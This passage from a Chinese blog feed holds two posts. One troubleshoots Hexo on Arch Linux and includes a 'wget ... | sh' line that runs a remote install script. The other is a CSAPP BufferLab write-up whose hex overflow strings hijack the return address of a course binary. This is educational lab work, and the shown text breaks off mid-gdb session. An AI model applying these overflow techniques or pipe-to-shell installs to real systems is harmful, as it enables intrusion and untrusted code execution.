      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Arch下Hexo配置的问题总结</title>
    <link href="http://blog.codedragon.tech/2017/07/06/Arch%E4%B8%8BHexo%E9%85%8D%E7%BD%AE%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.codedragon.tech/2017/07/06/Arch下Hexo配置的问题总结/</id>
    <published>2017-07-06T12:29:45.000Z</published>
    <updated>2017-07-06T15:45:04.672Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>近期将主力环境从macOS切换至Arch Linux，然后将博客从原环境迁移至现环境，本来以为过程会比较简单，结果却还是踩了几个坑，现在将配置过程中遇到的问题记录并且总结如下。</p>
</blockquote>
<h2 id="在Arch-Linux中安装Git和Node-js"><a href="#在Arch-Linux中安装Git和Node-js" class="headerlink" title="在Arch Linux中安装Git和Node.js"></a>在Arch Linux中安装Git和Node.js</h2><p>根据<a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="external">Hexo官方文档</a>的说明，安装Hexo需要的依赖为Git和Node.js。<br>Git的安装比较简单，使用Arch Linux的默认包管理器pacman即可安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pacman -S git</div></pre></td></tr></table></figure><br>Node.js官方文档推荐使用nvm安装，并且官方文档给出了安装脚本。<br>但是我的电脑使用的是伪fish——参考<a href="https://wiki.archlinux.org/index.php/Fish" target="_blank" rel="external">Arch Wiki</a>，我通过的是通过给terminal emulator添加参数的方式进入fish的。<br>因此，我的默认shell仍然是bash。而该安装脚本在检测到我的默认shell之后直接将相关的导出环境变量的命令添加至了.bashrc，导致了进入fish之后由于相关的环境变量丢失无法找到nvm命令的问题。</p>
<ol>
<li>第一种解决方法是采用Node.js的fish版安装脚本，该脚本托管在<a href="https://github.com/Alex7Kom/nvm-fish" target="_blank" rel="external">Github</a>上，但是该脚本目前已不再被MAINTAINED，需要自行承担风险。</li>
<li>第二种解决方法是采用<a href="https://github.com/edc/bass" target="_blank" rel="external">bass</a>包装原始的nvm。</li>
</ol>
<p>对于第二种解决方法，我们首先使用官方文档的安装脚本安装nvm：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</div></pre></td></tr></table></figure><br>然后我们按照Github上的教程手动安装bass：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/edc/bass.git</div><div class="line">$ cd bass</div><div class="line">$ make install</div></pre></td></tr></table></figure><br>最后我们建立如下的文件并重启终端，即可正常地在fish中使用nvm：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat ~/.config/fish/functions/nvm.fish</div><div class="line">function nvm</div><div class="line">    bass source ~/.nvm/nvm.sh --no-use &apos;;&apos; nvm $argv</div><div class="line">end</div></pre></td></tr></table></figure><br>使用nvm安装Node.js最新版本的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nvm install v8.1.3</div></pre></td></tr></table></figure><br>最后我们安装hexo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
<h2 id="hexo-server报EMFILE错误"><a href="#hexo-server报EMFILE错误" class="headerlink" title="hexo server报EMFILE错误"></a>hexo server报EMFILE错误</h2><p>报错内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Error: EMFILE, too many open files</div></pre></td></tr></table></figure><br>Hexo官网的<a href="https://hexo.io/zh-cn/docs/troubleshooting.html" target="_blank" rel="external">问题解答</a>中给出了如下描述：<br>虽然 Node.js 有非阻塞 I/O，同步 I/O 的数量仍被系统所限制，在生成大量静态文件的时候，您可能会碰到 EMFILE 错误，您可以尝试提高同步 I/O 的限制数量来解决此问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ulimit -n 10000</div></pre></td></tr></table></figure><br>但是当我尝试使用ulimit的时候，却报了如下的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Permission denied when changing resource of type &apos;Maximum number of open file descriptors&apos;</div></pre></td></tr></table></figure><br>在这之后进行了如下的尝试：</p>
<ol>
<li>使用sudo无法运行ulimit，后su至root运行，虽然没有报错，但是使用<code>ulimit -n</code>查看发现修改失败。</li>
<li>尝试添加参数-S和-H，没有效果。</li>
<li>最后根据<a href="https://bbs.archlinux.org/viewtopic.php?id=202694" target="_blank" rel="external">Arch Forum</a>上的回答，修改了<code>/etc/security/limits.conf</code>文件并重启电脑，问题解决。</li>
</ol>
<h2 id="hexo-server报ENOSPC错误"><a href="#hexo-server报ENOSPC错误" class="headerlink" title="hexo server报ENOSPC错误"></a>hexo server报ENOSPC错误</h2><p>Hexo官网的<a href="https://hexo.io/zh-cn/docs/troubleshooting.html" target="_blank" rel="external">问题解答</a>中给出了如下描述：<br>它可以用过运行 <code>$ npm dedupe</code> 来解决，如果不起作用的话，可以尝试在 Linux 终端中运行下列命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p</div></pre></td></tr></table></figure><br>这将会提高你能监视的文件数量。<br><code>$ npm dedupe</code>没有解决问题，最后使用上述的命令解决了问题。（注意在fish中，<code>&#39;&amp;&amp;&#39;</code>要用<code>&#39;COMMAND; and COMMAND&#39;</code>来替代）</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;近期将主力环境从macOS切换至Arch Linux，然后将博客从原环境迁移至现环境，本来以为过程会比较简单，结果却还是踩了几个坑，现在将配置过程中遇到的问题记录并且总结如下。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;在Arch-Lin
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.codedragon.tech/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="问题" scheme="http://blog.codedragon.tech/tags/%E9%97%AE%E9%A2%98/"/>
    
      <category term="踩坑" scheme="http://blog.codedragon.tech/tags/%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统BufferLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/05/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FBufferLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/</id>
    <published>2017-05-16T06:28:12.000Z</published>
    <updated>2017-05-16T06:31:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
<ul>
<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
</ul>
<p>IA32的过程调用遵循如下的规则：</p>
<ol>
<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
<li>分配局部的栈空间，主要用于临时变量的存储</li>
<li>执行被调用者的指令</li>
<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
<li>执行ret，过程返回并继续执行调用者的指令</li>
</ol>
<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </div><div class="line">0x3dde924c</div></pre></td></tr></table></figure></p>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</div></pre></td></tr></table></figure></p>
<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
<p>值得注意的是，bufbomb函数接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* getbuf */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</div><div class="line">Gets(buf);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* test */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> val;</div><div class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></div><div class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</div><div class="line"></div><div class="line">val = getbuf();</div><div class="line"></div><div class="line"><span class="comment">/* Check for corrupted stack */</span></div><div class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</div><div class="line">validate(<span class="number">3</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</div><div class="line">validate(<span class="number">0</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080491f4 &lt;getbuf&gt;:</div><div class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</div><div class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</div><div class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</div><div class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</div><div class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </div><div class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div><div class="line">run with level1</div></pre></td></tr></table></figure></p>
<p>阶段0完成。</p>
<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (val == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</div><div class="line">validate(<span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">08048c42 &lt;fizz&gt;:</div><div class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</div><div class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</div><div class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</div><div class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</div><div class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c5e:       <span class="number">08</span></div><div class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</div><div class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048c84:       <span class="number">08</span></div><div class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</div><div class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 4c 92 de 3d /* cookie */</div></pre></td></tr></table></figure></p>
<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Fizz!: You called fizz(0x3dde924c)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段1完成。</p>
<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</div><div class="line">validate(<span class="number">2</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span class="keyword">done</span>.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x80491fa</div><div class="line">(gdb) run -u BlackDragon</div><div class="line">Starting program: 